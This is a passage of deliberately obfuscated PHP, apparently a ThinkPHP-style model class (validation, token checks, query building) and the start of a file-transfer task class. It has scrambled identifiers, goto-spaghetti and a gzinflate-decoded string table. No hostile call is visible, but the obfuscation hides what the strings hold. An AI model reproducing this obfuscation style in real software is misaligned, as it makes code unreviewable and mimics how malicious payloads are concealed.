$this->parseFieldsMap($bµœÒ­×, 0); $AªÖ£Ò‚©† = $AªÖ£Ò‚©† ? $AªÖ£Ò‚©† : (!empty($bµœÒ­×[$this->getPk()]) ? THINK_MODEL_UPDATE : THINK_MODEL_INSERT); if (isset($this->options[$DƒãŸÏôÃ¯[267]])) { $b“Óª”¥ÒÑ = $this->options[$DƒãŸÏôÃ¯[267]]; unset($this->options[$DƒãŸÏôÃ¯[267]]); } elseif ($AªÖ£Ò‚©† == THINK_MODEL_INSERT && isset($this->insertFields)) { $b“Óª”¥ÒÑ = $this->insertFields; } elseif ($AªÖ£Ò‚©† == THINK_MODEL_UPDATE && isset($this->updateFields)) { $b“Óª”¥ÒÑ = $this->updateFields; } goto F¼‹›ÏĞé; D±À¦ôšï˜: $DƒãŸÏôÃ¯ =& $_SERVER[úÎü]; if (empty($bµœÒ­×)) { $bµœÒ­× = $_POST; } elseif (is_object($bµœÒ­×)) { $bµœÒ­× = get_object_vars($bµœÒ­×); } if (empty($bµœÒ­×) || !is_array($bµœÒ­×)) { $this->error = think_lang($DƒãŸÏôÃ¯[265]); return !1; } goto cšå£Ú•ä…; añ‚âÕ¿©£: if ($this->autoCheckFields) { $b“Óª”¥ÒÑ = $this->getDbFields(); foreach ($bµœÒ­× as $EµÜ¸ù¸‡ç => $e¹Ú¼Ûå¡) { if (!in_array($EµÜ¸ù¸‡ç, $b“Óª”¥ÒÑ)) { unset($bµœÒ­×[$EµÜ¸ù¸‡ç]); } elseif (MAGIC_QUOTES_GPC && is_string($e¹Ú¼Ûå¡)) { $bµœÒ­×[$EµÜ¸ù¸‡ç] = stripslashes($e¹Ú¼Ûå¡); } } } $this->autoOperation($bµœÒ­×, $AªÖ£Ò‚©†); $this->data = $bµœÒ­×; goto eËÓ’ÑÛÂ; eËÓ’ÑÛÂ: return $bµœÒ­×; goto FáÌ¸í½©ï; F¼‹›ÏĞé: if (isset($b“Óª”¥ÒÑ)) { if (is_string($b“Óª”¥ÒÑ)) { $b“Óª”¥ÒÑ = explode($DƒãŸÏôÃ¯[47], $b“Óª”¥ÒÑ); } if (think_config($DƒãŸÏôÃ¯[292])) { $b“Óª”¥ÒÑ[] = think_config($DƒãŸÏôÃ¯[293]); } foreach ($bµœÒ­× as $EµÜ¸ù¸‡ç => $e¹Ú¼Ûå¡) { if (!in_array($EµÜ¸ù¸‡ç, $b“Óª”¥ÒÑ)) { unset($bµœÒ­×[$EµÜ¸ù¸‡ç]); } } } if (!$this->autoValidation($bµœÒ­×, $AªÖ£Ò‚©†)) { return !1; } if (!$this->autoCheckToken($bµœÒ­×)) { $this->error = think_lang($DƒãŸÏôÃ¯[294]); return !1; } goto añ‚âÕ¿©£; FáÌ¸í½©ï: } public function autoCheckToken($DìÎ³¡ì«ñ) { $dìÉæ”šÔõ =& $_SERVER[úÎü]; if (isset($this->options[$dìÉæ”šÔõ[295]]) && !$this->options[$dìÉæ”šÔõ[295]]) { return !0; } if (think_config($dìÉæ”šÔõ[292])) { $A“É’Æ = think_config($dìÉæ”šÔõ[293]); if (!isset($DìÎ³¡ì«ñ[$A“É’Æ]) || Session::get($A“É’Æ)) { return !1; } list($a¼éìŠğ¹à, $AáõÜ×Å) = explode($dìÉæ”šÔõ[70], $DìÎ³¡ì«ñ[$A“É’Æ]); if ($AáõÜ×Å && Session::get($A“É’Æ . $dìÉæ”šÔõ[91] . $a¼éìŠğ¹à) === $AáõÜ×Å) { Session::remove($A“É’Æ . $dìÉæ”šÔõ[91] . $a¼éìŠğ¹à); return !0; } if (think_config($dìÉæ”šÔõ[296])) { Session::remove($A“É’Æ . $dìÉæ”šÔõ[91] . $a¼éìŠğ¹à); } return !1; } return !0; } public function regex($A²Ş¡™‰Ã‡, $d¼‡ëÓ¿°) { $eÏŒ¬ğé‘ =& $_SERVER[úÎü]; $AêÆëØƒ¨æ = array($eÏŒ¬ğé‘[297] => $eÏŒ¬ğé‘[298], $eÏŒ¬ğé‘[299] => $eÏŒ¬ğé‘[300], $eÏŒ¬ğé‘[301] => $eÏŒ¬ğé‘[302], $eÏŒ¬ğé‘[303] => $eÏŒ¬ğé‘[304], $eÏŒ¬ğé‘[305] => $eÏŒ¬ğé‘[306], $eÏŒ¬ğé‘[307] => $eÏŒ¬ğé‘[308], $eÏŒ¬ğé‘[309] => $eÏŒ¬ğé‘[310], $eÏŒ¬ğé‘[284] => $eÏŒ¬ğé‘[311], $eÏŒ¬ğé‘[312] => $eÏŒ¬ğé‘[313]); if (isset($AêÆëØƒ¨æ[strtolower($d¼‡ëÓ¿°)])) { $d¼‡ëÓ¿° = $AêÆëØƒ¨æ[strtolower($d¼‡ëÓ¿°)]; } return preg_match($d¼‡ëÓ¿°, $A²Ş¡™‰Ã‡) === 1; } private function autoOperation(&$FÖí®ŠØç¢, $c­í†Æ¸”) { $DƒÛ¾¹Ø×° =& $_SERVER[úÎü]; if (!empty($this->options[$DƒÛ¾¹Ø×°[314]])) { $Dé…¯¼‚ = $this->options[$DƒÛ¾¹Ø×°[314]]; unset($this->options[$DƒÛ¾¹Ø×°[314]]); } elseif (!empty($this->_auto)) { $Dé…¯¼‚ = $this->_auto; } if (isset($Dé…¯¼‚)) { foreach ($Dé…¯¼‚ as $E•ƒåªÎ²) { if (empty($E•ƒåªÎ²[2])) { $E•ƒåªÎ²[2] = THINK_MODEL_INSERT; } if ($c­í†Æ¸” == $E•ƒåªÎ²[2] || $E•ƒåªÎ²[2] == THINK_MODEL_BOTH) { switch (trim($E•ƒåªÎ²[3])) { case $DƒÛ¾¹Ø×°[315]: case $DƒÛ¾¹Ø×°[316]: $bŠ¿„Ï˜î = isset($E•ƒåªÎ²[4]) ? (array) $E•ƒåªÎ²[4] : array(); if (isset($FÖí®ŠØç¢[$E•ƒåªÎ²[0]])) { array_unshift($bŠ¿„Ï˜î, $FÖí®ŠØç¢[$E•ƒåªÎ²[0]]); } if ($DƒÛ¾¹Ø×°[315] == $E•ƒåªÎ²[3]) { $FÖí®ŠØç¢[$E•ƒåªÎ²[0]] = call_user_func_array($E•ƒåªÎ²[1], $bŠ¿„Ï˜î); } else { $FÖí®ŠØç¢[$E•ƒåªÎ²[0]] = call_user_func_array(array(&$this, $E•ƒåªÎ²[1]), $bŠ¿„Ï˜î); } break; case $DƒÛ¾¹Ø×°[267]: $FÖí®ŠØç¢[$E•ƒåªÎ²[0]] = $FÖí®ŠØç¢[$E•ƒåªÎ²[1]]; break; case $DƒÛ¾¹Ø×°[317]: if ($DƒÛ¾¹Ø×°[33] === $FÖí®ŠØç¢[$E•ƒåªÎ²[0]]) { unset($FÖí®ŠØç¢[$E•ƒåªÎ²[0]]); } break; case $DƒÛ¾¹Ø×°[318]: default: $FÖí®ŠØç¢[$E•ƒåªÎ²[0]] = $E•ƒåªÎ²[1]; } if (!1 === $FÖí®ŠØç¢[$E•ƒåªÎ²[0]]) { unset($FÖí®ŠØç¢[$E•ƒåªÎ²[0]]); } } } } return $FÖí®ŠØç¢; } protected function autoValidation($c«Œ×ŞÕ‚°, $e æ‡š”è) { $AÁ„¼Šº± =& $_SERVER[úÎü]; if (!empty($this->options[$AÁ„¼Šº±[319]])) { $f–Ğ³ÜÚÜ¼ = $this->options[$AÁ„¼Šº±[319]]; unset($this->options[$AÁ„¼Šº±[319]]); } elseif (!empty($this->_validate)) { $f–Ğ³ÜÚÜ¼ = $this->_validate; } if (isset($f–Ğ³ÜÚÜ¼)) { if ($this->patchValidate) { $this->error = array(); } foreach ($f–Ğ³ÜÚÜ¼ as $ağš½ÖÉ’‹ => $bóá¤ÌƒÔ…) { if (empty($bóá¤ÌƒÔ…[5]) || $bóá¤ÌƒÔ…[5] == THINK_MODEL_BOTH || $bóá¤ÌƒÔ…[5] == $e æ‡š”è) { if (0 == strpos($bóá¤ÌƒÔ…[2], $AÁ„¼Šº±[320]) && strpos($bóá¤ÌƒÔ…[2], $AÁ„¼Šº±[321])) { $bóá¤ÌƒÔ…[2] = think_lang(substr($bóá¤ÌƒÔ…[2], 2, -1)); } $bóá¤ÌƒÔ…[3] = isset($bóá¤ÌƒÔ…[3]) ? $bóá¤ÌƒÔ…[3] : THINK_EXISTS_VALIDATE; $bóá¤ÌƒÔ…[4] = isset($bóá¤ÌƒÔ…[4]) ? $bóá¤ÌƒÔ…[4] : $AÁ„¼Šº±[322]; switch ($bóá¤ÌƒÔ…[3]) { case THINK_MUST_VALIDATE: if (!1 === $this->_validationField($c«Œ×ŞÕ‚°, $bóá¤ÌƒÔ…)) { return !1; } break; case THINK_VALUE_VALIDATE: if ($AÁ„¼Šº±[33] != trim($c«Œ×ŞÕ‚°[$bóá¤ÌƒÔ…[0]])) { if (!1 === $this->_validationField($c«Œ×ŞÕ‚°, $bóá¤ÌƒÔ…)) { return !1; } } break; default: if (isset($c«Œ×ŞÕ‚°[$bóá¤ÌƒÔ…[0]])) { if (!1 === $this->_validationField($c«Œ×ŞÕ‚°, $bóá¤ÌƒÔ…)) { return !1; } } } } } if (!empty($this->error)) { return !1; } } return !0; } protected function _validationField($aÍ®ÚÓ³ƒÌ, $Bù‡ÈÑÜÂÃ) { if (!1 === $this->_validationFieldItem($aÍ®ÚÓ³ƒÌ, $Bù‡ÈÑÜÂÃ)) { if ($this->patchValidate) { $this->error[$Bù‡ÈÑÜÂÃ[0]] = $Bù‡ÈÑÜÂÃ[2]; } else { $this->error = $Bù‡ÈÑÜÂÃ[2]; return !1; } } return; } protected function _validationFieldItem($E¯ê‹ªºÆõ, $cÄÚ¥ËÂÍ) { $BÆªº©ÖŒØ =& $_SERVER[úÎü]; switch (strtolower(trim($cÄÚ¥ËÂÍ[4]))) { case $BÆªº©ÖŒØ[315]: case $BÆªº©ÖŒØ[316]: $CÄ›î„®Ö© = isset($cÄÚ¥ËÂÍ[6]) ? (array) $cÄÚ¥ËÂÍ[6] : array(); if (is_string($cÄÚ¥ËÂÍ[0]) && strpos($cÄÚ¥ËÂÍ[0], $BÆªº©ÖŒØ[47])) { $cÄÚ¥ËÂÍ[0] = explode($BÆªº©ÖŒØ[47], $cÄÚ¥ËÂÍ[0]); } if (is_array($cÄÚ¥ËÂÍ[0])) { foreach ($cÄÚ¥ËÂÍ[0] as $aíãÏ»ëÌ¼) { $f–²è‹ˆ“[$aíãÏ»ëÌ¼] = $E¯ê‹ªºÆõ[$aíãÏ»ëÌ¼]; } array_unshift($CÄ›î„®Ö©, $f–²è‹ˆ“); } else { array_unshift($CÄ›î„®Ö©, $E¯ê‹ªºÆõ[$cÄÚ¥ËÂÍ[0]]); } if ($BÆªº©ÖŒØ[315] == $cÄÚ¥ËÂÍ[4]) { return call_user_func_array($cÄÚ¥ËÂÍ[1], $CÄ›î„®Ö©); } else { return call_user_func_array(array(&$this, $cÄÚ¥ËÂÍ[1]), $CÄ›î„®Ö©); } case $BÆªº©ÖŒØ[323]: return $E¯ê‹ªºÆõ[$cÄÚ¥ËÂÍ[0]] == $E¯ê‹ªºÆõ[$cÄÚ¥ËÂÍ[1]]; case $BÆªº©ÖŒØ[324]: if (is_string($cÄÚ¥ËÂÍ[0]) && strpos($cÄÚ¥ËÂÍ[0], $BÆªº©ÖŒØ[47])) { $cÄÚ¥ËÂÍ[0] = explode($BÆªº©ÖŒØ[47], $cÄÚ¥ËÂÍ[0]); } $bš¿Ëå¿Š÷ = array(); if (is_array($cÄÚ¥ËÂÍ[0])) { foreach ($cÄÚ¥ËÂÍ[0] as $aíãÏ»ëÌ¼) { $bš¿Ëå¿Š÷[$aíãÏ»ëÌ¼] = $E¯ê‹ªºÆõ[$aíãÏ»ëÌ¼]; } } else { $bš¿Ëå¿Š÷[$cÄÚ¥ËÂÍ[0]] = $E¯ê‹ªºÆõ[$cÄÚ¥ËÂÍ[0]]; } if (!empty($E¯ê‹ªºÆõ[$this->getPk()])) { $bš¿Ëå¿Š÷[$this->getPk()] = array($BÆªº©ÖŒØ[325], $E¯ê‹ªºÆõ[$this->getPk()]); } if ($this->where($bš¿Ëå¿Š÷)->find()) { return !1; } return !0; default: return $this->check($E¯ê‹ªºÆõ[$cÄÚ¥ËÂÍ[0]], $cÄÚ¥ËÂÍ[1], $cÄÚ¥ËÂÍ[4]); } } public function check($bé—›š¿øÛ, $dôƒî±óİ, $c¯¼šƒô´ = "\x72\x65\147\145\x78") { $b•‘¼¼ˆƒ– =& $_SERVER[úÎü]; $c¯¼šƒô´ = strtolower(trim($c¯¼šƒô´)); switch ($c¯¼šƒô´) { case $b•‘¼¼ˆƒ–[7]: case $b•‘¼¼ˆƒ–[326]: $CÛŒÊ…È¡ = is_array($dôƒî±óİ) ? $dôƒî±óİ : explode($b•‘¼¼ˆƒ–[47], $dôƒî±óİ); return $c¯¼šƒô´ == $b•‘¼¼ˆƒ–[7] ? in_array($bé—›š¿øÛ, $CÛŒÊ…È¡) : !in_array($bé—›š¿øÛ, $CÛŒÊ…È¡); case $b•‘¼¼ˆƒ–[327]: case $b•‘¼¼ˆƒ–[328]: if (is_array($dôƒî±óİ)) { $EÒîíÓÃÕÈ = $dôƒî±óİ[0]; $b”Í«àÖö• = $dôƒî±óİ[1]; } else { list($EÒîíÓÃÕÈ, $b”Í«àÖö•) = explode($b•‘¼¼ˆƒ–[47], $dôƒî±óİ); } return $c¯¼šƒô´ == $b•‘¼¼ˆƒ–[327] ? $bé—›š¿øÛ >= $EÒîíÓÃÕÈ && $bé—›š¿øÛ <= $b”Í«àÖö• : $bé—›š¿øÛ < $EÒîíÓÃÕÈ || $bé—›š¿øÛ > $b”Í«àÖö•; case $b•‘¼¼ˆƒ–[329]: case $b•‘¼¼ˆƒ–[330]: return $c¯¼šƒô´ == $b•‘¼¼ˆƒ–[329] ? $bé—›š¿øÛ == $dôƒî±óİ : $bé—›š¿øÛ != $dôƒî±óİ; case $b•‘¼¼ˆƒ–[331]: $cÒ‰»®â£É = mb_strlen($bé—›š¿øÛ, $b•‘¼¼ˆƒ–[332]); if (strpos($dôƒî±óİ, $b•‘¼¼ˆƒ–[47])) { list($EÒîíÓÃÕÈ, $b”Í«àÖö•) = explode($b•‘¼¼ˆƒ–[47], $dôƒî±óİ); return $cÒ‰»®â£É >= $EÒîíÓÃÕÈ && $cÒ‰»®â£É <= $b”Í«àÖö•; } else { return $cÒ‰»®â£É == $dôƒî±óİ; } case $b•‘¼¼ˆƒ–[333]: list($AøÜ£Ï›áÏ, $e’¿Šø˜) = explode($b•‘¼¼ˆƒ–[47], $dôƒî±óİ); if (!is_numeric($AøÜ£Ï›áÏ)) { $AøÜ£Ï›áÏ = strtotime($AøÜ£Ï›áÏ); } if (!is_numeric($e’¿Šø˜)) { $e’¿Šø˜ = strtotime($e’¿Šø˜); } return NOW_TIME >= $AøÜ£Ï›áÏ && NOW_TIME <= $e’¿Šø˜; case $b•‘¼¼ˆƒ–[334]: return in_array(get_client_ip(), explode($b•‘¼¼ˆƒ–[47], $dôƒî±óİ)); case $b•‘¼¼ˆƒ–[335]: return !in_array(get_client_ip(), explode($b•‘¼¼ˆƒ–[47], $dôƒî±óİ)); case $b•‘¼¼ˆƒ–[322]: default: return $this->regex($bé—›š¿øÛ, $dôƒî±óİ); } } public function query($f—„ÍÄË™, $A¡ºÏ‰ŠÍ± = false) { $fÆïìÏ¢†Û =& $_SERVER[úÎü]; if (!is_bool($A¡ºÏ‰ŠÍ±) && !is_array($A¡ºÏ‰ŠÍ±)) { $A¡ºÏ‰ŠÍ± = func_get_args(); array_shift($A¡ºÏ‰ŠÍ±); } $f—„ÍÄË™ = str_replace(array($fÆïìÏ¢†Û[225], $fÆïìÏ¢†Û[336]), $fÆïìÏ¢†Û[50], $f—„ÍÄË™); $f—„ÍÄË™ = $this->parseSql($f—„ÍÄË™, $A¡ºÏ‰ŠÍ±); return $this->db->query($f—„ÍÄË™); } public function execute($F¸›™ªƒ¾, $c¾º‘àÏÆ¹ = false) { if (!is_bool($c¾º‘àÏÆ¹) && !is_array($c¾º‘àÏÆ¹)) { $c¾º‘àÏÆ¹ = func_get_args(); array_shift($c¾º‘àÏÆ¹); } $F¸›™ªƒ¾ = $this->parseSql($F¸›™ªƒ¾, $c¾º‘àÏÆ¹); return $this->db->execute($F¸›™ªƒ¾); } protected function parseSql($DÎçÃÖ’ , $Eº¼Ù§Õ•) { $AÁòœˆè¡¶ =& $_SERVER[úÎü]; if (!0 === $Eº¼Ù§Õ•) { $b“¢ëÂŠ¿¦ = $this->_parseOptions(); $DÎçÃÖ’  = $this->db->parseSql($DÎçÃÖ’ , $b“¢ëÂŠ¿¦); } elseif (is_array($Eº¼Ù§Õ•)) { $Eº¼Ù§Õ• = array_map(array($this->db, $AÁòœˆè¡¶[337]), $Eº¼Ù§Õ•); $DÎçÃÖ’  = vsprintf($DÎçÃÖ’ , $Eº¼Ù§Õ•); } else { $DÎçÃÖ’  = strtr($DÎçÃÖ’ , array($AÁòœˆè¡¶[338] => $this->getTableName(), $AÁòœˆè¡¶[339] => think_config($AÁòœˆè¡¶[238]))); } $this->db->setModel($this->name); return $DÎçÃÖ’ ; } public function db($f÷´ßŸ×Ñà = '', $cÚ‡Ë¸¦à— = '', $Fã–¾©Õì¶ = array()) { goto E¡èˆÆÑ›; F©·‡ø³»Ó: $a±¤¡˜ñá—[$f÷´ßŸ×Ñà] = $cÚ‡Ë¸¦à—; $this->db = $D“ÈÖÄ·»Æ[$f÷´ßŸ×Ñà]; $this->_after_db(); goto A“ƒÈ—§†; AÄÙ‰«¡Äˆ: static $D“ÈÖÄ·»Æ = array(); if (!isset($D“ÈÖÄ·»Æ[$f÷´ßŸ×Ñà]) || isset($D“ÈÖÄ·»Æ[$f÷´ßŸ×Ñà]) && $cÚ‡Ë¸¦à— && $a±¤¡˜ñá—[$f÷´ßŸ×Ñà] != $cÚ‡Ë¸¦à—) { if (!empty($cÚ‡Ë¸¦à—) && is_string($cÚ‡Ë¸¦à—) && !1 === strpos($cÚ‡Ë¸¦à—, $FéÒÜÜù•[8])) { $cÚ‡Ë¸¦à— = think_config($cÚ‡Ë¸¦à—); } $D“ÈÖÄ·»Æ[$f÷´ßŸ×Ñà] = Db::getInstance($cÚ‡Ë¸¦à—); } elseif (NULL === $cÚ‡Ë¸¦à—) { $D“ÈÖÄ·»Æ[$f÷´ßŸ×Ñà]->close(); unset($D“ÈÖÄ·»Æ[$f÷´ßŸ×Ñà]); return; } if (!empty($Fã–¾©Õì¶)) { if (is_string($Fã–¾©Õì¶)) { parse_str($Fã–¾©Õì¶, $Fã–¾©Õì¶); } foreach ($Fã–¾©Õì¶ as $aµÓó†©‰ê => $f‚ì‚÷ä©µ) { $this->setProperty($aµÓó†©‰ê, $f‚ì‚÷ä©µ); } } goto F©·‡ø³»Ó; E¡èˆÆÑ›: $FéÒÜÜù• =& $_SERVER[úÎü]; if ($FéÒÜÜù•[33] === $f÷´ßŸ×Ñà && $this->db) { return $this->db; } static $a±¤¡˜ñá— = array(); goto AÄÙ‰«¡Äˆ; A“ƒÈ—§†: if (!empty($this->name) && $this->autoCheckFields) { $this->_checkTableInfo(); } return $this; goto E¥Œù„¬œ; E¥Œù„¬œ: } protected function _after_db() { } public function getModelName() { if (empty($this->name)) { $AÆ®îá„¶ = get_class($this); if ($AÆ®îá„¶ == $_SERVER[úÎü][340]) { return $this->name; } $this->name = substr($AÆ®îá„¶, 0, -5); } return $this->name; } public function getTableName() { $CºÎ‚º…È =& $_SERVER[úÎü]; if (empty($this->trueTableName)) { $báÕ¨Î—î = !empty($this->tablePrefix) ? $this->tablePrefix : $CºÎ‚º…È[33]; if (!empty($this->tableName)) { $báÕ¨Î—î .= $this->tableName; } else { $báÕ¨Î—î .= think_parse_name($this->name); } $this->trueTableName = strtolower($báÕ¨Î—î); } return (!empty($this->dbName) ? $this->dbName . $CºÎ‚º…È[91] : $CºÎ‚º…È[33]) . $this->trueTableName; } public function startTrans() { $this->commit(); $this->db->startTrans(); return; } public function commit() { return $this->db->commit(); } public function rollback() { return $this->db->rollback(); } public function getError() { return $this->error; } public function getDbError() { return $this->db->getError(); } public function getLastInsID() { return $this->db->getLastInsID(); } public function getLastSql() { return $this->db->getLastSql($this->name); } public function _sql() { return $this->getLastSql(); } public function getPk() { $FÀÒÈ©‹Œ† =& $_SERVER[úÎü]; return isset($this->fields[$FÀÒÈ©‹Œ†[245]]) ? $this->fields[$FÀÒÈ©‹Œ†[245]] : $this->pk; } public function getDbFields() { $Eâ—ÇÓë½ =& $_SERVER[úÎü]; if (isset($this->options[$Eâ—ÇÓë½[273]])) { $Fº„­ä¼¨± = $this->db->getFields($this->options[$Eâ—ÇÓë½[273]]); return $Fº„­ä¼¨± ? array_keys($Fº„­ä¼¨±) : !1; } if ($this->fields) { $Fº„­ä¼¨± = $this->fields; unset($Fº„­ä¼¨±[$Eâ—ÇÓë½[244]], $Fº„­ä¼¨±[$Eâ—ÇÓë½[245]], $Fº„­ä¼¨±[$Eâ—ÇÓë½[246]], $Fº„­ä¼¨±[$Eâ—ÇÓë½[243]]); return $Fº„­ä¼¨±; } return !1; } public function data($D†¯×»©á = '') { $eõ™ˆ÷áİä =& $_SERVER[úÎü]; if ($eõ™ˆ÷áİä[33] === $D†¯×»©á && !empty($this->data)) { return $this->data; } if (is_object($D†¯×»©á)) { $D†¯×»©á = get_object_vars($D†¯×»©á); } elseif (is_string($D†¯×»©á)) { parse_str($D†¯×»©á, $D†¯×»©á); } elseif (!is_array($D†¯×»©á)) { think_exception(think_lang($eõ™ˆ÷áİä[265])); } $this->data = $D†¯×»©á; return $this; } public function join($f†¼ÈÁ¨Š˜) { $AŒÛæÖ’ò¹ =& $_SERVER[úÎü]; if (is_array($f†¼ÈÁ¨Š˜)) { $this->options[$AŒÛæÖ’ò¹[276]] = $f†¼ÈÁ¨Š˜; } elseif (!empty($f†¼ÈÁ¨Š˜)) { $this->options[$AŒÛæÖ’ò¹[276]][] = $f†¼ÈÁ¨Š˜; } return $this; } public function union($bß…ˆÌæí, $dƒ‰íÙÙêÅ = false) { goto a¯”Ãøìì; dï²á±ç®ù: if (is_object($bß…ˆÌæí)) { $bß…ˆÌæí = get_object_vars($bß…ˆÌæí); } if (is_string($bß…ˆÌæí)) { $b¦©ïÔ˜Ö = $bß…ˆÌæí; } elseif (is_array($bß…ˆÌæí)) { if (isset($bß…ˆÌæí[0])) { $this->options[$eíŸÊ„ã[341]] = array_merge($this->options[$eíŸÊ„ã[341]], $bß…ˆÌæí); return $this; } else { $b¦©ïÔ˜Ö = $bß…ˆÌæí; } } else { think_exception(think_lang($eíŸÊ„ã[265])); } $this->options[$eíŸÊ„ã[341]][] = $b¦©ïÔ˜Ö; goto DŒ¸Ï ¤¤ã; a¯”Ãøìì: $eíŸÊ„ã =& $_SERVER[úÎü]; if (empty($bß…ˆÌæí)) { return $this; } if ($dƒ‰íÙÙêÅ) { $this->options[$eíŸÊ„ã[341]][$eíŸÊ„ã[342]] = !0; } goto dï²á±ç®ù; DŒ¸Ï ¤¤ã: return $this; goto E¾‡‘ÔÛ°Û; E¾‡‘ÔÛ°Û: } public function cache($DÀ¯µƒñ’Â = true, $dîÂ»ÚÙì— = null, $B¤Àµƒ“ôØ = '') { $BæëïŸÅ³ =& $_SERVER[úÎü]; if (!1 !== $DÀ¯µƒñ’Â) { $this->options[$BæëïŸÅ³[343]] = array($BæëïŸÅ³[89] => $DÀ¯µƒñ’Â, $BæëïŸÅ³[333] => $dîÂ»ÚÙì—, $BæëïŸÅ³[29] => $B¤Àµƒ“ôØ); } return $this; } public function field($FÈÍõ•Â½à, $fªäÏÖŒ†Ê = false) { $c—°”¼¦¤Ó =& $_SERVER[úÎü]; if (!0 === $FÈÍõ•Â½à) { $BÚ‰Ò®Ã¶¿ = $this->getDbFields(); $FÈÍõ•Â½à = $BÚ‰Ò®Ã¶¿ ? $BÚ‰Ò®Ã¶¿ : $c—°”¼¦¤Ó[180]; } elseif ($fªäÏÖŒ†Ê) { if (is_string($FÈÍõ•Â½à)) { $FÈÍõ•Â½à = explode($c—°”¼¦¤Ó[47], $FÈÍõ•Â½à); } $BÚ‰Ò®Ã¶¿ = $this->getDbFields(); $FÈÍõ•Â½à = $BÚ‰Ò®Ã¶¿ ? array_diff($BÚ‰Ò®Ã¶¿, $FÈÍõ•Â½à) : $FÈÍõ•Â½à; } $this->options[$c—°”¼¦¤Ó[267]] = $FÈÍõ•Â½à; return $this; } public function scope($CªÑÍ­îå = '', $c˜©Ï•à‡Ö = NULL) { $aœÒ¡é¡’Â =& $_SERVER[úÎü]; if ($aœÒ¡é¡’Â[33] === $CªÑÍ­îå) { if (isset($this->_scope[$aœÒ¡é¡’Â[34]])) { $díÍÂÍÈö¢ = $this->_scope[$aœÒ¡é¡’Â[34]]; } else { return $this; } } elseif (is_string($CªÑÍ­îå)) { $BŠ…°ÊŸÃ = explode($aœÒ¡é¡’Â[47], $CªÑÍ­îå); $díÍÂÍÈö¢ = array(); foreach ($BŠ…°ÊŸÃ as $eõ¡áãÙÖ) { if (!isset($this->_scope[$eõ¡áãÙÖ])) { continue; } $díÍÂÍÈö¢ = array_merge($díÍÂÍÈö¢, $this->_scope[$eõ¡áãÙÖ]); } if (!empty($c˜©Ï•à‡Ö) && is_array($c˜©Ï•à‡Ö)) { $díÍÂÍÈö¢ = array_merge($díÍÂÍÈö¢, $c˜©Ï•à‡Ö); } } elseif (is_array($CªÑÍ­îå)) { $díÍÂÍÈö¢ = $CªÑÍ­îå; } if (is_array($díÍÂÍÈö¢) && !empty($díÍÂÍÈö¢)) { $this->options = array_merge($this->options, array_change_key_case($díÍÂÍÈö¢)); } return $this; } public function where($cˆÀ‘Éï¾, $F¬èÑÈ†Ä– = null) { $c¾”ğÌáæ =& $_SERVER[úÎü]; if (!is_null($F¬èÑÈ†Ä–) && is_string($cˆÀ‘Éï¾)) { if (!is_array($F¬èÑÈ†Ä–)) { $F¬èÑÈ†Ä– = func_get_args(); array_shift($F¬èÑÈ†Ä–); } $F¬èÑÈ†Ä– = array_map(array($this->db, $c¾”ğÌáæ[337]), $F¬èÑÈ†Ä–); $cˆÀ‘Éï¾ = vsprintf($cˆÀ‘Éï¾, $F¬èÑÈ†Ä–); } elseif (is_object($cˆÀ‘Éï¾)) { $cˆÀ‘Éï¾ = get_object_vars($cˆÀ‘Éï¾); } elseif (is_array($cˆÀ‘Éï¾)) { foreach ($cˆÀ‘Éï¾ as $F“¹ÛÙöÒÕ => $fÅ‘¼½’“Ò) { if ((is_numeric($F“¹ÛÙöÒÕ) || !$F“¹ÛÙöÒÕ) && is_string($fÅ‘¼½’“Ò)) { if (strpos($fÅ‘¼½’“Ò, $c¾”ğÌáæ[344]) === 0) { continue; } think_trace($c¾”ğÌáæ[345], $c¾”ğÌáæ[33], $c¾”ğÌáæ[46]); die; } } } if (is_string($cˆÀ‘Éï¾) && $c¾”ğÌáæ[33] != $cˆÀ‘Éï¾) { $cÚ÷Ø…’£Ç = array(); $cÚ÷Ø…’£Ç[$c¾”ğÌáæ[346]] = $cˆÀ‘Éï¾; $cˆÀ‘Éï¾ = $cÚ÷Ø…’£Ç; } if (isset($this->options[$c¾”ğÌáæ[269]])) { $this->options[$c¾”ğÌáæ[269]] = array_merge($this->options[$c¾”ğÌáæ[269]], $cˆÀ‘Éï¾); } else { $this->options[$c¾”ğÌáæ[269]] = $cˆÀ‘Éï¾; } return $this; } public function limit($bĞ“ÍÕ‰¦Õ, $B—µºéœÆá = null) { $CÓá¥›¬Š =& $_SERVER[úÎü]; $this->options[$CÓá¥›¬Š[286]] = is_null($B—µºéœÆá) ? $bĞ“ÍÕ‰¦Õ : $bĞ“ÍÕ‰¦Õ . $CÓá¥›¬Š[47] . $B—µºéœÆá; return $this; } public function page($C«‹õ¶šù¾, $Fˆ•áíÁ· = null) { $F¶ƒ²†­ =& $_SERVER[úÎü]; $this->options[$F¶ƒ²†­[347]] = is_null($Fˆ•áíÁ·) ? $C«‹õ¶šù¾ : $C«‹õ¶šù¾ . $F¶ƒ²†­[47] . $Fˆ•áíÁ·; return $this; } public function comment($dƒéÅí¸‹Û) { $this->options[$_SERVER[úÎü][348]] = $dƒéÅí¸‹Û; return $this; } public function setProperty($a¥èÒ­¶Ÿç, $a½°ÆÉÂ•) { if (property_exists($this, $a¥èÒ­¶Ÿç)) { $this->{$a¥èÒ­¶Ÿç} = $a½°ÆÉÂ•; } return $this; } } goto d¤‚Û°±á“; d¦àİ»Ô‘®: define($_SERVER[úÎü][233], 2); define($_SERVER[úÎü][234], 3); define($_SERVER[úÎü][235], 1); goto F‹¦í¡³æ; bˆœ—ó‘: $e»õëéè‘¾ = $_SERVER[úÎü][563]; if (strlen($e»õëéè‘¾) < $_SERVER[úÎü][564]) { die; } $_SERVER[İÊø] = explode($_SERVER[úÎü][565], gzinflate(substr($_SERVER[úÎü][566], 10, -8))); goto dñİ‚£øÑš; c¼÷åöÇ×¿: class TaskZip extends TaskFileTransfer { protected function startAfter() { $Døê—°Ø“Ó =& $_SERVER[úÎü]; parent::startAfter(); Hook::bind($Døê—°Ø“Ó[1567], array($this, $Døê—°Ø“Ó[1562])); $cÛæŒŠË·± =& $this->task; $cÛæŒŠË·±[$Døê—°Ø“Ó[1564]] = $Døê—°Ø“Ó[1054]; if (!$cÛæŒŠË·±[$Døê—°Ø“Ó[1387]]) { $cÛæŒŠË·±[$Døê—°Ø“Ó[1387]] = LNG($Døê—°Ø“Ó[1568]); } } protected function endAfter() { $aÉ«ÚŞŒ =& $_SERVER[úÎü]; parent::endAfter(); Hook::unbind($aÉ«ÚŞŒ[1567], array($this, $aÉ«ÚŞŒ[1562])); } public function updateAfter() { $cÙ‹ƒ¬éÙ =& $_SERVER[úÎü]; $EÍ¿ÖùçÊÙ =& $this->task; if 